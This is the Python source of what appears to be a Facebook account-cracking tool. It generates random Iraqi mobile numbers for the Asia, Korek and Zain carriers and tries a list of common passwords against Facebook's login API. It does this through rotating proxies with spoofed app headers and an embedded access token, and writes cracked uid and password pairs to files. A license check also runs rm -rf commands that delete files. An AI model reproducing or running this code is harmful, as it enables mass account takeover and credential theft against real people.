    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def number_cracking():
    os.system('clear')
    animation(logo)
    ip = requests.get("https://api.ipify.org").text
    animation(f' \033[1;36;40m├───\033[1;33;40m[\033[1;32;40m+\033[1;33;40m] \033[1;35;40m»»» YOUR IP  : \033[1;32;40m{ip}')
    animation(f' \033[1;36;40m├───\033[1;33;40m[\033[1;32;40m+\033[1;33;40m] \033[1;35;40m»»»   Time   : \033[1;34;40m{date}')
    #print(' ')
    #print(' \033[0;91m=========================================')
    #animation('  \033[1;33;40mChoose \033[1;31;40mSERVER \033[1;33;40mCracking  ')
    #print(" \033[1;32;40m[\033[1;33;40m𝟙\033[1;32;40m] \033[1;32;40mMETHOD 1 free")
    #print(" \033[1;32;40m[\033[1;33;40m𝟚\033[1;32;40m] \033[1;35;40mMETHOD 2 mobile")
    #print(" \033[1;32;40m[\033[1;33;40m𝟛\033[1;32;40m] \033[1;33;40mMETHOD 3 mbasic")
    #print(" \033[1;32;40m[\033[1;33;40m𝟜\033[1;32;40m] \033[1;36;40mMETHOD 4 touch")
    #print(" \033[1;32;40m[\033[1;33;40m𝟝\033[1;32;40m] \033[1;34;40mMETHOD 5 usa")
    #print(' \033[0;91m=========================================')
    #hc = input(' \033[97;1m[\033[92;1m+\033[97;1m]CHOOSE :\033[92;1m ')
    #time.sleep(1)
    #if hc in ['1','01']:
    #    time.sleep(1)
    #    method.append('free')
    #elif hc in ['2','02']:
    #    time.sleep(1)
    #    method.append('mobile')
    #elif hc in ['3','03']:
    #    time.sleep(1)
    #    method.append('mbasic')
    #elif hc in ['4','04']:
    #    time.sleep(1)
    #    method.append('touch')
    #elif hc in ['5','05']:
    #    time.sleep(1)
    #    method.append('usa')
    #else:
    #    print(' \033[0;91m=========================================')
    #    animation(' \033[1;33m[\033[1;91m×\033[1;33m]\033[1;91m SELECT CORRECTLY ')
    #    time.sleep(0.5)
    #    input(' \033[1;32m[\033[1;33m+\033[1;32m]\033[1;33mPress ENTER To Try Again ')
    #    time.sleep(0.5)
    #    setting()
    print(' \033[0;91m=========================================')
    animation('  \033[1;33;40mChoose \033[1;31;40mCARRIAR \033[1;33;40mFor Craking ')
    print(" \033[1;91m[\033[1;32;40m𝟙\033[1;91m]\033[1;32m \033[1;35;40mAISA")
    print(" \033[1;91m[\033[1;32;40m𝟚\033[1;91m]\033[1;91m \033[1;32;40mKOREK ")
    print(" \033[1;91m[\033[1;32;40m𝟛\033[1;91m]\033[1;34m \033[1;33;40mZAIN ")
    print(' \033[0;91m=========================================')
    pass_meth = input(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;32;40mCHOOSE :-\033[1;34;40m ')
    print(' \033[0;91m=========================================')
    time.sleep(1)
    if pass_meth in ['1','01']:
        time.sleep(0.5)
        Asia()
    elif pass_meth in ['2','02']:
        time.sleep(0.5)
        Korek()
    elif pass_meth in ['3','03']:
        time.sleep(0.5)
        Zain()
    else:
        print(' \033[0;91m=========================================')
        animation(' \033[1;33m[\033[1;91m×\033[1;33m]\033[1;91m SELECT CORRECTLY ')
        time.sleep(0.5)
        input(' \033[1;32m[\033[1;33m+\033[1;32m]\033[1;33mPress ENTER To Try Again ')
        time.sleep(0.5)
        number_cracking()
    exit()
def Asia():
    user=[]
    global lim
    time.sleep(1)
    print('')
    print(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;35;40mCode Asia: \033[1;32;40m964770 , 964771 , 964772 , 964773 .....')
    code = input(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;32;40mCHOOSE Code :-\033[1;34;40m ')
    print(' \033[0;91m=========================================')
    print('')
    time.sleep(1)
    try:
            print(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;35;40mlimit Example: \033[1;32;40m2000, 3000, 5000, 10000')
            limit = int(input(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;32;40mCHOOSE Limit :-\033[1;34;40m'))
            print(' \033[0;91m=========================================')
            print('')
            time.sleep(1)
    except ValueError:
            limit = 5000
    lim=limit
    for nmbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(nmp)
    with tred(max_workers=30) as AWM:     
            tl = str(len(user))
            animation('  \033[1;32;40mCrackring Password Will Be Started \033[1;36;40m. \033[1;35;40m. \033[1;34;40m. \033[1;33;40m. \033[1;32;40m. \033[1;31;40m.')
            time.sleep(0.6)
            print(" \033[97;1m[\033[92;1m•\033[97;1m] \033[1;36;40mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
            print(" \033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
            print(f' \033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Turn_Off/On_Flight_Mode For Speed Up ')
            print(' \033[97;1m[\033[92;1m+\033[97;1m] Total IDs : \033[1;32m'+tl)
            print(' \033[0;91m=========================================')
            print(" \033[97;1m[\033[92;1m+\033[97;1m] OK IDs SAVE \033[1;92m✓ \033[97;1mUnTrXa-Numb-OK.txt")
            print(" \033[97;1m[\033[92;1m+\033[97;1m] CP IDs SAVE \033[0;91m× \033[97;1mUnTrXa-Numb-CP.txt")
            print(' \033[0;91m=========================================')
            time.sleep(1)
            for psx in user:
                ids = code+psx
                passlist = [psx,ids,'20222022','kurdkurd','kurd1122','kurd12345','kurd123','peshawar','kurd','1234','12345','112233','1212','123456','11223344','1990']
                AWM.submit(rndm2,ids,passlist)
    print('\n\033[1;32m===============================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m+\033[97;1m] OK :\033[0;92m %s '+str(len(oks)))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '+str(len(cps)))
    print('\033[97;1m[\033[92;1m+\033[97;1m] 2F :\033[0;93m %s '+str(len(twf)))
    print('\n\033[1;32m===============================================')
    time.sleep(1)
    crk_agi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m Do You Want Crack Again Y/N :-  ')
    if crk_agi in ['Y','y','yes','YES','Yes']:
        animation(' \033[1;32m Your Back To Main Menu..... ')
        time.sleep(1)
        os.system('python3 UnTrXa_FB_Cracking.py')
    elif crk_agi in ['N','n','NO','No']:
        animation(' \033[1;91m𝐘𝐨𝐮𝐫 𝐄𝐗𝐈𝐓 ')
        time.sleep(1)
        exit()
    else:
        animation(' \033[1;91m𝐘𝐨𝐮𝐫 𝐄𝐗𝐈𝐓 ')
        time.sleep(1)
        exit()                                     
def Korek():
    user=[]
    global lim
    time.sleep(1)
    print('')
    print(' \033[97;1m[\033[92;1m+\033[97;1m]\033[1;35;40mCode Korek: \033[1;32;40m964750 , 964751.....')
    code = input(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;32;40mCHOOSE Code :-\033[1;34;40m ')
    print(' \033[0;91m=========================================')
    print('')
    time.sleep(1)
    try:
            print(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;35;40mlimit Example: \033[1;32;40m2000, 3000, 5000, 10000')
            limit = int(input(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;32;40mCHOOSE Limit :-\033[1;34;40m'))
            print(' \033[0;91m=========================================')
            print('')
            time.sleep(1)
    except ValueError:
            limit = 1000
    lim=limit
    for nmbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(nmp)
    with tred(max_workers=30) as AWM:     
            tl = str(len(user))
            animation('  \033[1;32;40mCrackring Password Will Be Started \033[1;36;40m. \033[1;35;40m. \033[1;34;40m. \033[1;33;40m. \033[1;32;40m. \033[1;31;40m.')
            time.sleep(0.6)
            print(" \033[97;1m[\033[92;1m•\033[97;1m] \033[1;36;40mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
            print(" \033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
            print(f' \033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Turn_Off/On_Flight_Mode For Speed Up ')
            print(' \033[97;1m[\033[92;1m+\033[97;1m] Total IDs : \033[1;32m'+tl)
            print(' \033[0;91m=========================================')
            print(" \033[97;1m[\033[92;1m+\033[97;1m] OK IDs SAVE \033[1;92m✓ \033[97;1mUnTrXa-Numb-OK.txt")
            print(" \033[97;1m[\033[92;1m+\033[97;1m] CP IDs SAVE \033[0;91m× \033[97;1mUnTrXa-Numb-CP.txt")
            print(' \033[0;91m=========================================')
            time.sleep(1)
            for psx in user:
                ids = code+psx
                passlist = [psx,ids,'20222022','kurdkurd','kurd1122','kurd12345','kurd123','peshawar','kurd','1234','12345','112233','1212','123456','11223344','1990']
                AWM.submit(rndm2,ids,passlist)
    print('\n\033[1;32m===============================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m+\033[97;1m] OK :\033[0;92m %s '+str(len(oks)))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '+str(len(cps)))
    print('\033[97;1m[\033[92;1m+\033[97;1m] 2F :\033[0;93m %s '+str(len(twf)))
    print('\n\033[1;32m===============================================')
    time.sleep(1)
    crk_agi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m Do You Want Crack Again Y/N :-  ')
    if crk_agi in ['Y','y','yes','YES','Yes']:
        animation(' \033[1;32m Your Back To Main Menu..... ')
        time.sleep(1)
        os.system('python3 UnTrXa_FB_Cracking.py')
    elif crk_agi in ['N','n','NO','No']:
        animation(' \033[1;91m𝐘𝐨𝐮𝐫 𝐄𝐗𝐈𝐓 ')
        time.sleep(1)
        exit()
    else:
        animation(' \033[1;91m𝐘𝐨𝐮𝐫 𝐄𝐗𝐈𝐓 ')
        time.sleep(1)
        exit() 
def Zain():
    user=[]
    global lim
    time.sleep(1)
    print('')
    print(' \033[97;1m[\033[92;1m+\033[97;1m]\033[1;35;40mCode Asia: \033[1;32;40m964780 , 964771 , 964772 , 964773 .....')
    code = input(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;32;40mCHOOSE Code :-\033[1;34;40m ')
    print(' \033[0;91m=========================================')
    print('')
    time.sleep(1)
    try:
            print(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;35;40mlimit Example: \033[1;32;40m2000, 3000, 5000, 10000')
            limit = int(input(' \033[1;91m[\033[92;1m+\033[1;91m] \033[1;32;40mCHOOSE Limit :-\033[1;34;40m'))
            print(' \033[0;91m=========================================')
            print('')
            time.sleep(1)
    except ValueError:
            limit = 1000
    lim=limit
    for nmbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            user.append(nmp)
    with tred(max_workers=30) as AWM:     
            tl = str(len(user))
            animation('  \033[1;32;40mCrackring Password Will Be Started \033[1;36;40m. \033[1;35;40m. \033[1;34;40m. \033[1;33;40m. \033[1;32;40m. \033[1;31;40m.')
            time.sleep(0.6)
            print(" \033[97;1m[\033[92;1m•\033[97;1m] \033[1;36;40mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
            print(" \033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
            print(f' \033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Turn_Off/On_Flight_Mode For Speed Up ')
            print(' \033[97;1m[\033[92;1m+\033[97;1m] Total IDs : \033[1;32m'+tl)
            print(' \033[0;91m=========================================')
            print(" \033[97;1m[\033[92;1m+\033[97;1m] OK IDs SAVE \033[1;92m✓ \033[97;1mUnTrXa-Numb-OK.txt")
            print(" \033[97;1m[\033[92;1m+\033[97;1m] CP IDs SAVE \033[0;91m× \033[97;1mUnTrXa-Numb-CP.txt")
            print(' \033[0;91m=========================================')
            time.sleep(1)
            for psx in user:
                ids = code+psx
                passlist = [psx,ids,'20222022','kurdkurd','kurd1122','kurd12345','kurd123','peshawar','kurd','1234','12345','112233','1212','123456','11223344','1990']
                AWM.submit(rndm2,ids,passlist)
    print('\n\033[1;32m===============================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m+\033[97;1m] OK :\033[0;92m %s '+str(len(oks)))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '+str(len(cps)))
    print('\033[97;1m[\033[92;1m+\033[97;1m] 2F :\033[0;93m %s '+str(len(twf)))
    print('\n\033[1;32m===============================================')
    time.sleep(1)
    crk_agi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m Do You Want Crack Again Y/N :-  ')
    if crk_agi in ['Y','y','yes','YES','Yes']:
        animation(' \033[1;32m Your Back To Main Menu..... ')
        time.sleep(1)
        os.system('python3 UnTrXa_FB_Cracking.py')
    elif crk_agi in ['N','n','NO','No']:
        animation(' \033[1;91m𝐘𝐨𝐮𝐫 𝐄𝐗𝐈𝐓 ')
        time.sleep(1)
        exit()
    else:
        animation(' \033[1;91m𝐘𝐨𝐮𝐫 𝐄𝐗𝐈𝐓 ')
        time.sleep(1)
        exit() 

oks=[]
cps=[]
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        bo = random.choice([m,k,h,b,u,x])
                        sys.stdout.write(f"\r\r {P}[{H}UnTrXa-Numb{P}]-[{H}%s{P}]-[{H}OK{bo}•{H}%s{P}]-[{H}PROXY{bo}•{H}{len(prox)}{P}]-[{H}PASS{bo}•{H}{len(passlist)}{P}]"%(loop,len(oks)))
                        sys.stdout.flush()
                        for pas in passlist:
                                nip=random.choice(prox)
                                proxs= {'http': 'socks4://'+nip}
                                application_version = str(random.randint(111,777))+'.0.0.'+str(random.randrange(11,77))+str(random.randint(111,777))
                                application_version_code=str(random.randint(000000000,999999999))
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                network = random.choice(['AisaCell','Korek Telecom','IQ Online','FFTP'])
                                UnTraceableX = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.0,width=1080,height=2360};FBLC/en_US;FBRV/str(random.randint(000000000 ,999999999));FBCR/Roshan;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix x677;FBSV/8.1.0;FBBK/3;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                                head ={
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-connection-type':'MOBILE.LTE',
                    'user-agent':UnTraceableX,
                    "Connection": "Keep-Alive",
                    'x-tigon-is-retry':'False',
                    'x-fb-http-engine':'Liger',
                    'x-fb-client-ip':'True',
                    'x-fb-server-cluster':'True',
                    'x-fb-device-group':str(random.randint(2000,4000)),
                    "X-FB-Connection-Bandwidth": str(random.randint(2e7, 4e7)),
                    'x-fb-sim-hni':str(random.randint(20000,40000)),
                    'x-fb-net-hni':str(random.randint(20000,40000)),
                    'x-fb-rmd':'cached=0;state=NO_MATCH',
                    'x-fb-request-analytics-tags':'graphservice',
                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-friendly-name':'authenticate'
                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False,proxies=proxs).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('UnTrXa-Numb-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [UnTrXa-Numb-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('UnTrXa-Numb-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [UnTrXa-Numb-CP] '+uid+' | '+pas+'\033[1;97m')
                                                open('UnTrXa-Numb-CP.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def License():
  os.system("clear")
  uuid = str('!2#3#@1@2@32@34@#44@32@34@#44')
  id =(uuid)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/UnTraceableX/UnTrXa_FB_Clone/main/License.txt").text
    if id in httpCaht:
        msg = str(os.geteuid())
        time.sleep(1)
        number_cracking()
    else:
        os.system("clear")
        animation(logo)
        time.sleep(4)
        animation('   \033[1;31mSorry, This Tool License Expired.')
        time.sleep(2)
        os.system('rm -rf UnTrXa_ID_FILE_Creating.py') 
        os.system('rm -rf UnTrXa_FB_Cracking.py') 
        os.system('rm -rf .untrxatoken.txt')
        os.system("rm -rf .untrxacok.txt")
        os.system('rm -rf .UnTrXa-Proxy.txt') 
        os.system('rm -rf UnTrXa_Numb_FB_Cloning.py')
        os.system('rm -rf FB_Cracing_Target.py')
        os.system('rm -rf UnTrXa-OK UnTrXa-CP')
        exit()       
  except:
    sys.exit()
    if name == 'main':
     License()
License()

